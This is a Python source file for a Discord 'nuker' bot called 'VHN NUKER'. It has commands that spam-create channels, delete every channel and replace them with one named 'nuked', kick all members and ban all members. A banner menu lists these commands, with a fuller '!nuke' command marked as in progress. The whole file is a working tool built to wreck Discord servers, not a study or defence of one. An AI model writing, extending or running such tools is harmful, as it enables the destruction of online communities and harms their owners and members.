import os
import discord
from discord.ext import commands
import colorama
from colorama import Fore, Back
colorama.init()

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.event
async def on_ready():
  print("Your bot is ready to go!")
  os.system('title VHN NUKER')
  os.system('cls')
  return main()

@bot.command(name='ch')
async def create_channel(ctx, channel_name: str, num_channels: int):
    guild = ctx.guild
    for i in range(num_channels):
        await guild.create_text_channel(f'{channel_name}')
    print(f'{num_channels} channels named "{channel_name}" have been created.')

@bot.command(name='dch')
async def delete_all_channels(ctx):
    for channel in ctx.guild.channels:
        await channel.delete()
    guild = ctx.guild
    await guild.create_text_channel('nuked')
    print('All channels have been deleted.')

@bot.command(name='kick')
@commands.has_permissions(kick_members=True)
async def kickall(ctx):
    for member in ctx.guild.members:
        try:
            await member.kick(reason="Kicking all members.")
            print(f'Kicked {member.name}')
        except Exception as e:
            print(f'Failed to kick {member.name}: {e}')

@bot.command(name='ban')
@commands.has_permissions(ban_members=True)
async def banall(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban(reason="Baning all members.")
            print(f'Banned {member.name}')
        except:
            print(f'Failed to ban {member.name}')

def main():
  print(f"""
    {Fore.RED}██    ██ ██   ██ ███    ██ 
    {Fore.RED}██    ██ ██   ██ ████   ██ 
    {Fore.RED}██    ██ ███████ ██ ██  ██ 
    {Fore.RED} ██  ██  ██   ██ ██  ██ ██ 
    {Fore.RED}  ████   ██   ██ ██   ████   
  {Fore.RESET}
               {Back.RED}Made by -X#0991{Back.RESET}
  
  ─═══════════════════════════─
      {Fore.RED}|!ch
      {Fore.RED}|!dch
      {Fore.RED}|!kick
      {Fore.RED}|!ban
      {Fore.RED}|!nuke - working on{Fore.RESET}
  ─═══════════════════════════─
  """)

bot.run("TOKEN")
